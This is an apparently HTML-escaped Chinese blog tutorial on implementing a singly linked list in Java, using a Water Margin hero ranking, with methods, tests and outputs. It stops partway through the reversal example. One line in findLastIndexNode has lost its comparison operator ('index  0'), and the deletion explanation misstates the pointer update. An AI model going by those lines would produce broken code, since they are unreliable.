&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzEzMTkyNjI0ODA5LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;13、链表特点&quot;&gt;1.3、链表特点&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;链表是以节点的方式来存储，是 &lt;strong&gt;链式存储&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;data 域存放数据，next 域 &lt;strong&gt;指向下一个节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;链表分 &lt;strong&gt;带头节点&lt;/strong&gt;的链表和 &lt;strong&gt;没有头节点&lt;/strong&gt;的链表， 根据实际的需求来确定&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;2、链表应用场景&quot;&gt;2、链表应用场景&lt;/h2&gt;
&lt;h3 id=&quot;21、水浒英雄榜&quot;&gt;2.1、水浒英雄榜&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;使用带 head 头的 &lt;strong&gt;单向链表&lt;/strong&gt;实现【水浒英雄排行榜管理】&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzEzMTkyOTUxNTg2LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;22、链表节点定义&quot;&gt;2.2、链表节点定义&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;no ：英雄编号&lt;/li&gt;
&lt;li&gt;name ：英雄名字&lt;/li&gt;
&lt;li&gt;nickName ：英雄昵称&lt;/li&gt;
&lt;li&gt;next ：指向下一个 HeroNode 节点&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
class HeroNode {
        public int no;
        public String name;
        public String nickName;
        public HeroNode next;

        public HeroNode(int no, String name, String nickname) {
                this.no = no;
                this.name = name;
                this.nickName = nickname;
        }

        @Override
        public String toString() {
                return &quot;HeroNode [no=&quot; + no + &quot;, name=&quot; + name + &quot;, nickName=&quot; + nickName + &quot;]&quot;;
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;23、链表定义&quot;&gt;2.3、链表定义&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;DummyHead ： &lt;strong&gt;头结点不存放数据&lt;/strong&gt;，仅仅作为当前链表的入口&lt;/li&gt;
&lt;li&gt;head 字段的值不能改变，一旦改变，就 &lt;strong&gt;丢失了整个链表的入口&lt;/strong&gt;，我们也就无法通过 head 找到链表了&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
class SingleLinkedList {

        private HeroNode head = new HeroNode(0, &quot;&quot;, &quot;&quot;);

        public HeroNode getHead() {
                return head;
        }

&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;24、遍历链表&quot;&gt;2.4、遍历链表&lt;/h3&gt;
&lt;h4 id=&quot;241、代码思路&quot;&gt;2.4.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;何时遍历完成？ &lt;strong&gt;temp == null&lt;/strong&gt; 表明当前节点为 null ，即表示已到链表末尾&lt;/li&gt;
&lt;li&gt;如何遍历？ &lt;strong&gt;temp = temp.next&lt;/strong&gt; ，每次输出当前节点信息之后，temp 指针后移&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;242、代码实现&quot;&gt;2.4.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;遍历链表&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void list() {

        if (head.next == null) {
                System.out.println(&quot;链表为空&quot;);
                return;
        }

        HeroNode temp = head.next;
        while (true) {

                if (temp == null) {
                        break;
                }

                System.out.println(temp);

                temp = temp.next;
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;25、尾部插入&quot;&gt;2.5、尾部插入&lt;/h3&gt;
&lt;h4 id=&quot;251、代码思路&quot;&gt;2.5.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;如何在链表末尾插入节点？
&lt;ul&gt;&lt;li&gt;首先需要遍历链表，找到链表最后一个节点，当 &lt;strong&gt;temp.next == null&lt;/strong&gt;时，temp 节点指向链表最后一个节点&lt;/li&gt;
&lt;li&gt;然后在 temp 节点之后插入节点即可： *&lt;em&gt;temp.next = heroNode&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI1MjExNTEyNDc4LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;252、代码实现&quot;&gt;2.5.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;在链表尾部插入节点&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void add(HeroNode heroNode) {

    HeroNode temp = head;

    while (true) {

        if (temp.next == null) {
            break;
        }

        temp = temp.next;
    }

    temp.next = heroNode;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;测试代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;       public static void main(String[] args) {

                HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
                HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
                HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
                HeroNode hero4 = new HeroNode(4, &quot;林冲&quot;, &quot;豹子头&quot;);

                SingleLinkedList singleLinkedList = new SingleLinkedList();

                singleLinkedList.add(hero1);
                singleLinkedList.add(hero2);
                singleLinkedList.add(hero3);
                singleLinkedList.add(hero4);

                singleLinkedList.list();
        }
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;程序运行结果&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;26、按顺序插入&quot;&gt;2.6、按顺序插入&lt;/h3&gt;
&lt;h4 id=&quot;261、代码思路&quot;&gt;2.6.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;应该如何执行插入？（待插入节点为 heroNode）
&lt;ul&gt;&lt;li&gt;首先需要遍历链表，找到链表中编号值比 heroNode.no 大的节点，暂且叫它 biggerNode ，然后把 heroNode 插入到 biggerNode 之前即可&lt;/li&gt;
&lt;li&gt;怎么找 biggerNode ？当 &lt;strong&gt;temp.next.no &amp;gt; heroNode.no&lt;/strong&gt; 时，这时 temp.next 节点就是 biggerNode 节点。&lt;/li&gt;
&lt;li&gt;为什么是 temp.next 节点？只有找到 temp 节点和 temp.next（biggerNode ）节点，才能在 temp 节点和 temp.next 节点之间插入 heroNode 节点&lt;/li&gt;
&lt;li&gt;怎么插入？
&lt;ul&gt;&lt;li&gt;heroNode .next = temp.next;&lt;/li&gt;
&lt;li&gt;temp.next = heroNode;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI2MTExOTI0MTI5LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;262、代码实现&quot;&gt;2.6.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;按照英雄排名的顺序进行插入&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void addByOrder(HeroNode heroNode) {

    HeroNode temp = head;
    boolean flag = false;
    while (true) {
        if (temp.next == null) {
            break;
        }
        if (temp.next.no &amp;gt; heroNode.no) {
            break;
        } else if (temp.next.no == heroNode.no) {

            flag = true;
            break;
        }
        temp = temp.next;
    }

    if (flag) {
        System.out.printf(&quot;准备插入的英雄的编号 %d 已经存在了, 不能加入\n&quot;, heroNode.no);
    } else {

        heroNode.next = temp.next;
        temp.next = heroNode;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;测试代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {

    HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
    HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
    HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
    HeroNode hero4 = new HeroNode(4, &quot;林冲&quot;, &quot;豹子头&quot;);

    SingleLinkedList singleLinkedList = new SingleLinkedList();

    singleLinkedList.addByOrder(hero1);
    singleLinkedList.addByOrder(hero4);
    singleLinkedList.addByOrder(hero2);
    singleLinkedList.addByOrder(hero3);

    singleLinkedList.list();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;程序运行结果&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;27、修改节点信息&quot;&gt;2.7、修改节点信息&lt;/h3&gt;
&lt;h4 id=&quot;271、代码思路&quot;&gt;2.7.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;如何找到指定节点？ *&lt;em&gt;temp.no = newHeroNode.no&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;272、代码实现&quot;&gt;2.7.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;修改指定节点信息&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void update(HeroNode newHeroNode) {

    if (head.next == null) {
        System.out.println(&quot;链表为空~&quot;);
        return;
    }

    HeroNode temp = head.next;
    boolean flag = false;
    while (true) {
        if (temp == null) {
            break;
        }
        if (temp.no == newHeroNode.no) {

            flag = true;
            break;
        }
        temp = temp.next;
    }

    if (flag) {
        temp.name = newHeroNode.name;
        temp.nickName = newHeroNode.nickName;
    } else {
        System.out.printf(&quot;没有找到 编号 %d 的节点，不能修改\n&quot;, newHeroNode.no);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;测试代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {

    HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
    HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
    HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
    HeroNode hero4 = new HeroNode(4, &quot;林冲&quot;, &quot;豹子头&quot;);

    SingleLinkedList singleLinkedList = new SingleLinkedList();

    singleLinkedList.addByOrder(hero1);
    singleLinkedList.addByOrder(hero4);
    singleLinkedList.addByOrder(hero2);
    singleLinkedList.addByOrder(hero3);

    HeroNode newHeroNode = new HeroNode(2, &quot;小卢&quot;, &quot;玉麒麟~~&quot;);
    singleLinkedList.update(newHeroNode);

    singleLinkedList.list();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;程序运行结果&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5C0F;&amp;amp;#x5362;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;~~]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;28、删除节点&quot;&gt;2.8、删除节点&lt;/h3&gt;
&lt;h4 id=&quot;281、代码思路&quot;&gt;2.8.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;如何找到待删除的节点？遍历链表，当 &lt;strong&gt;temp.next == no&lt;/strong&gt; 时，temp.next 节点就是待删除的节点&lt;/li&gt;
&lt;li&gt;如何删除？ &lt;strong&gt;temp = temp.next.next&lt;/strong&gt; 即可删除 temp.next 节点，该节点没有引用指向它，会被垃圾回收机制回收&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI2MTExOTEyMDI5LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;282、代码实现&quot;&gt;2.8.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;删除指定节点&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void del(int no) {
    HeroNode temp = head;
    boolean flag = false;
    while (true) {
        if (temp.next == null) {
            break;
        }
        if (temp.next.no == no) {

            flag = true;
            break;
        }
        temp = temp.next;
    }

    if (flag) {

        temp.next = temp.next.next;
    } else {
        System.out.printf(&quot;要删除的 %d 节点不存在\n&quot;, no);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;测试代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {

    HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
    HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
    HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
    HeroNode hero4 = new HeroNode(4, &quot;林冲&quot;, &quot;豹子头&quot;);

    SingleLinkedList singleLinkedList = new SingleLinkedList();

    singleLinkedList.add(hero1);
    singleLinkedList.add(hero2);
    singleLinkedList.add(hero3);
    singleLinkedList.add(hero4);

    singleLinkedList.del(1);
    singleLinkedList.del(4);

    singleLinkedList.list();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;程序运行结果&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;29、总结&quot;&gt;2.9、总结&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;遍历链表，执行操作时，判断条件有时候是 temp ，有时候是 temp.next ，Why？
&lt;ul&gt;&lt;li&gt;对于插入、删除节点来说，需要知道 &lt;strong&gt;当前待操作的节点（heroNode）前一个节点的地址（指针）&lt;/strong&gt;，如果直接定位至当前待操作的节点 heroNode ，那没得玩。。。因为不知道heroNode 前一个节点的地址，无法进行插入、删除操作，所以 while 循环中的条件使用 temp.next 进行判断&lt;/li&gt;
&lt;li&gt;对于更新、遍历操作来说，我需要的仅仅就只是当前节点的信息，所以 while 循环中的条件使用 temp进行判断&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;头结点与首节点&lt;/strong&gt;
&lt;ul&gt;&lt;li&gt;参考资料：&lt;a href=&quot;https://blog.csdn.net/WYpersist/article/details/80288056&quot; target=&quot;_blank&quot;&gt;https://blog.csdn.net/WYpersist/article/details/80288056&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;头结点是为了操作的统一与方便而设立的，放在第一个元素结点之前，其数据域一般无意义（当然有些情况下也可存放链表的长度、用做监视哨等等）。&lt;/li&gt;
&lt;li&gt;首元结点也就是第一个元素的结点，它是头结点后边的第一个结点。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;3、单链表面试题&quot;&gt;3、单链表面试题&lt;/h2&gt;
&lt;h3 id=&quot;31、求单链表中有效节点的个数&quot;&gt;3.1、求单链表中有效节点的个数&lt;/h3&gt;
&lt;h4 id=&quot;311、代码思路&quot;&gt;3.1.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;求单链表中有效节点的个数：遍历即可&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;312、代码实现&quot;&gt;3.1.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;求单链表中有效节点的个数&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public static int getLength(HeroNode head) {
        if (head.next == null) {
                return 0;
        }
        int length = 0;

        HeroNode cur = head.next;
        while (cur != null) {
                length++;
                cur = cur.next;
        }
        return length;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;测试代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {

    HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
    HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
    HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
    HeroNode hero4 = new HeroNode(4, &quot;林冲&quot;, &quot;豹子头&quot;);

    SingleLinkedList singleLinkedList = new SingleLinkedList();

    singleLinkedList.add(hero1);
    singleLinkedList.add(hero2);
    singleLinkedList.add(hero3);
    singleLinkedList.add(hero4);

    singleLinkedList.list();

    System.out.println(&quot;有效的节点个数=&quot; + getLength(singleLinkedList.getHead()));
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;程序运行结果&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
&amp;amp;#x6709;&amp;amp;#x6548;&amp;amp;#x7684;&amp;amp;#x8282;&amp;amp;#x70B9;&amp;amp;#x4E2A;&amp;amp;#x6570;=4
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;32、查找单链表中的倒数第-k-个结点&quot;&gt;3.2、查找单链表中的倒数第 k 个结点&lt;/h3&gt;
&lt;h4 id=&quot;321、代码思路&quot;&gt;3.2.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;查找单链表中的倒数第k个结点 【新浪面试题】
&lt;ul&gt;&lt;li&gt;首先，获取整个链表中元素的个数 size&lt;/li&gt;
&lt;li&gt;在使用 for 循环定位至倒数第 index（形参） 个节点，返回即可&lt;/li&gt;
&lt;li&gt;for 循环的条件应如何确定？for (int i = 0; i &amp;lt; x; i++) 中 x 的值应是多少？我们需要定位至倒数第 index 个节点，在 for 循环之前，我们已经定位置首节点，还需再走 (size - index ) 步，定位至倒数第 index 个节点&lt;/li&gt;
&lt;li&gt;举例说明：链表中一共有 4 个元素，想要定位至倒数第 2 个节点，那么需要在首节点之后走两步，到达倒数第 2 个节点&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;322、代码实现&quot;&gt;3.2.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;查找单链表中的倒数第k个结点&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public static HeroNode findLastIndexNode(HeroNode head, int index) {

    if (head.next == null) {
        return null;
    }

    int size = getLength(head);

    if (index  0 || index &amp;gt; size) {
        return null;
    }

    HeroNode cur = head.next;
    for (int i = 0; i &amp;lt; size - index; i++) {
        cur = cur.next;
    }
    return cur;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;测试代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {

    HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
    HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
    HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
    HeroNode hero4 = new HeroNode(4, &quot;林冲&quot;, &quot;豹子头&quot;);

    SingleLinkedList singleLinkedList = new SingleLinkedList();

    singleLinkedList.add(hero1);
    singleLinkedList.add(hero2);
    singleLinkedList.add(hero3);
    singleLinkedList.add(hero4);

    singleLinkedList.list();

    HeroNode res = findLastIndexNode(singleLinkedList.getHead(), 2);
    System.out.println(&quot;res=&quot; + res);

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;程序运行结果&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
res=HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;33、单链表的反转&quot;&gt;3.3、单链表的反转&lt;/h3&gt;
&lt;h4 id=&quot;331、代码思路&quot;&gt;3.3.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;单链表的反转【腾讯面试题，有点难度】
&lt;ul&gt;&lt;li&gt;定义一个新的头结点 reverseHead ，一点一点将链表反转后，再串起来&lt;/li&gt;
&lt;li&gt;怎么个串法？
&lt;ul&gt;&lt;li&gt;在原链表中每读取一个节点（cur），先保存其下一个节点的地址（next），然后将 cur 节点放在新链表的最前面&lt;/li&gt;
&lt;li&gt;然后执行遍历： &lt;strong&gt;cur = next&lt;/strong&gt; ，即指针后移&lt;/li&gt;
&lt;li&gt;遍历完成后，新链表即是反转后的链表&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;如何将 cur 节点插入在新链表的最前面
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;cur.next = reverseHead.next;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;reverseHead.next = cur;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;while 循环终止条件？ &lt;strong&gt;cur == null&lt;/strong&gt; ：已遍历至链表尾部&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;单链表的翻转可以参考我的这篇博文：&lt;a href=&quot;https://blog.csdn.net/oneby1314/article/details/107577923&quot; target=&quot;_blank&quot;&gt;https://blog.csdn.net/oneby1314/article/details/107577923&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI1MjEyMTM3ODk3LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI2MTExODU0NjI3LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;332、代码实现&quot;&gt;3.3.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;单链表的反转&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public static void reversetList(HeroNode head) {

    if (head.next == null || head.next.next == null) {
        return;
    }

    HeroNode cur = head.next;
    HeroNode next = null;
    HeroNode reverseHead = new HeroNode(0, &quot;&quot;, &quot;&quot;);

    while (cur != null) {
        next = cur.next;
        cur.next = reverseHead.next;
        reverseHead.next = cur;
        cur = next;
    }

    head.next = reverseHead.next;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;测试代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {

    HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
    HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
    HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
    HeroNode hero4 = new HeroNode(4, &quot;林冲&quot;, &quot;豹子头&quot;);

    SingleLinkedList singleLinkedList = new SingleLinkedList();

    singleLinkedList.add(hero1);
    singleLinkedList.add(hero2);
